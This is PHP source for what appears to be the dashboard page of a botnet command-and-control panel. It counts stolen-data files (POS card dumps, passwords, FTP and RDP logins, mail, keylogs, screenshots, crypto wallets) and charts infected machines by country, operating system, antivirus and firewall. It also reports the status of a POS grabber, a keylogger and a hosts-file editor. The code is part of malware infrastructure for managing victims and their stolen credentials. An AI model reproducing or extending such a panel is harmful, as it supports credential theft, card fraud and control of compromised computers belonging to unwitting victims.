<?php
session_start();

require_once('inc/functions.php');
banned();
require_once('inc/session.php');
require_once('inc/config.php');
require_once('inc/html_grund.php');
include('inc/counts.php');
include('inc/cron.php');

$logpos = count(glob($folder."/dump/{*.log}", GLOB_BRACE));
$logsc  = count(glob($folder."/scr/{*.jpg}", GLOB_BRACE));
$logpw  = count(glob($folder."/pass/{*.LOG}", GLOB_BRACE));
$logms  = count(glob($folder."/ins/{*.Log}", GLOB_BRACE));
$logft  = count(glob($folder."/ftp/{*.txt}", GLOB_BRACE));
$logrp  = count(glob($folder."/rdp/{*.TXT}", GLOB_BRACE));
$logml  = count(glob($folder."/mail/{*.TxT}", GLOB_BRACE));
$logky  = count(glob($folder."/kyl/{*.html}", GLOB_BRACE));
$logwl  = count(glob($folder."/wallet/{*.wallet}", GLOB_BRACE));

?>

<script type='text/javascript' src='https://www.google.com/jsapi'></script>
        <script type='text/javascript'>
            google.load('visualization', '1', {'packages': ['geochart']});
            google.setOnLoadCallback(drawRegionsMap);

            function drawRegionsMap() {
                var data = google.visualization.arrayToDataTable([
                    ['Country', 'Bots'],
<?php
$result = mysql_query("SELECT DISTINCT cc FROM clients");
while ($row = mysql_fetch_array($result))
  {
    $a = $row['cc'];
    echo '                    [\'' . $row['cc'] . '\',';
    
    $result2 = mysql_query("SELECT * FROM clients WHERE cc='$a'");
    echo mysql_num_rows($result2) . '],' . PHP_EOL;
  }
?>

                    ]);

                    var options = {
                        sizeAxis: { minValue: 0, maxValue: 100 },
                        backgroundColor: 'transparent',
						//backgroundColor: {stroke: 'white' },						
						//backgroundColor: {strokeWidth: 0 },
                        colorAxis: {colors: ['#dd013b', '#ea013f']} // orange to blue
                    };

                    var chart = new google.visualization.GeoChart(document.getElementById('chart_country'));
                    chart.draw(data, options);
            };
        </script>   
        
    <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Reports', 'Count'],
          ['POS',     <?=$logpos?>],
          ['Passwords',      <?=$logpw?>],
          ['Mails',  <?=$logml?>],
          ['Instant messaging', <?=$logms?>],
          ['RDP', <?=$logrp?>],
          ['FTP',    <?=$logft?>],
          ['Keylogs', <?=$logky?>],
          ['Screen',    <?=$logsc?>],
          ['Wallets', <?=$logwl?>]
        ]);

        var options = {
          title: 'Reports',
          backgroundColor: 'transparent'      	         
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart'));
        chart.draw(data, options);
      }
      </script>
    
        <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Windows', 'Count'],
<?php
$result = mysql_query("SELECT DISTINCT os FROM clients");
while ($row = mysql_fetch_array($result))
  {
    $a = $row['os'];
    echo '                    [\'' . $row['os'] . '\',';
    
    $result2 = mysql_query("SELECT * FROM clients WHERE os='$a'");
    echo mysql_num_rows($result2) . '],' . PHP_EOL;
  }
?>
        ]);

        var options = {
          title: 'Operative System',
          backgroundColor: 'transparent'  
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart2'));
        chart.draw(data, options);
      }
    </script> 
    
        <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Status', 'Count'],
          ['Online',     <?=$online?>],
          ['Offline',      <?=$offline?>],
          ['Dead',  <?=$dead?>]
        ]);

        var options = {
          title: 'Bot Status',
          backgroundColor: 'transparent'  
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart3'));
        chart.draw(data, options);
      }
    </script> 
    
            <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Host', 'Count'],
          ['On',     <?=$hston?>],
          ['Off',      <?=$hstof?>]
         ]);

        var options = {
          title: 'Host Editor',
          backgroundColor: 'transparent'  
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart4'));
        chart.draw(data, options);
      }
    </script>
    
            <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['POS', 'Status'],
          ['On',     <?=$pson?>],
          ['Off',      <?=$psof?>]
        ]);

        var options = {
          title: 'POS Grabber',
          backgroundColor: 'transparent'  
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart5'));
        chart.draw(data, options);
      }
    </script>
    
            <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Keylogger', 'Status'],
          ['On',     <?=$kyon?>],
          ['Off',      <?=$kyof?>]
        ]);

        var options = {
          title: 'Keylogger Status',
          backgroundColor: 'transparent'  
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart6'));
        chart.draw(data, options);
      }
    </script>
    
            <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Architecture', 'Count'],
          ['x86',     <?=$x86?>],
          ['x64',     <?=$x64?>]
        ]);

        var options = {
          title: 'OS Architecture',
          backgroundColor: 'transparent'   
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart7'));
        chart.draw(data, options);
      }
    </script>
    
      <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Antivirus', 'Count'],
<?php
$result = mysql_query("SELECT DISTINCT admin FROM clients");
while ($row = mysql_fetch_array($result))
  {
    $a = $row['admin'];
    echo '                    [\'' . $row['admin'] . '\',';
    
    $result2 = mysql_query("SELECT * FROM clients WHERE admin='$a'");
    echo mysql_num_rows($result2) . '],' . PHP_EOL;
  }
?>
        ]);

        var options = {
          title: 'Antivirus',
          backgroundColor: 'transparent'  
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart8'));
        chart.draw(data, options);
      }
    </script>
    
            <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['Firewall', 'Count'],
<?php
$result = mysql_query("SELECT DISTINCT fw FROM clients");
while ($row = mysql_fetch_array($result))
  {
    $a = $row['fw'];
    echo '                    [\'' . $row['fw'] . '\',';
    
    $result2 = mysql_query("SELECT * FROM clients WHERE fw='$a'");
    echo mysql_num_rows($result2) . '],' . PHP_EOL;
  }
?>
        ]);

        var options = {
          title: 'Bot Type',
          backgroundColor: 'transparent'  
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart9'));
        chart.draw(data, options);
      }
    </script>            
                    
                    
<?php
echo '<link rel="stylesheet" type="text/css" href="css/stylex.css"/>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
		
	<script type="text/javascript">
    	$(document).ready(function(){
      		refreshBotsOnline();
    	});
    	
    	function refreshBotsOnline(){
        	$(\'#nav\').load(\'inc/html_menu.php\');
        	setTimeout(refreshBotsOnline, 5000);
    	}
	</script>';
echo "
<center>
<table width='100%' border='0'>
  <tr>
    <td colspan='3'><center><div id='chart_country' style='width: 1000; height: 400px;'></div></center></td>
    <td><table width='100%' border='1'>
        <tr>
            
        </tr>
    </table>
    </td>
  </tr>
  <tr>  
    <td><left><div id='piechart' style='width: 390px; height: 300px;'></left></td>
    <td><left><div id='piechart2' style='width: 390px; height: 300px;'></left></td>
    <td><left><div id='piechart3' style='width: 390px; height: 300px;'></left></td>
    </tr>
    <tr>
      <tr>
    <td><left><div id='piechart4' style='width: 390px; height: 300px;'></left></td>
    <td><left><div id='piechart5' style='width: 390px; height: 300px;'></left></td>
    <td><left><div id='piechart6' style='width: 390px; height: 300px;'></left></td>
    </tr>
    <tr>
    <td><left><div id='piechart7' style='width: 390px; height: 300px;'></left></td>
    <td><left><div id='piechart8' style='width: 390px; height: 300px;'></left></td>
    <td><left><div id='piechart9' style='width: 390px; height: 300px;'></left></td>
    </tr>
  </tr>
</table>
</center>";
require_once('inc/html_footer.php');

?>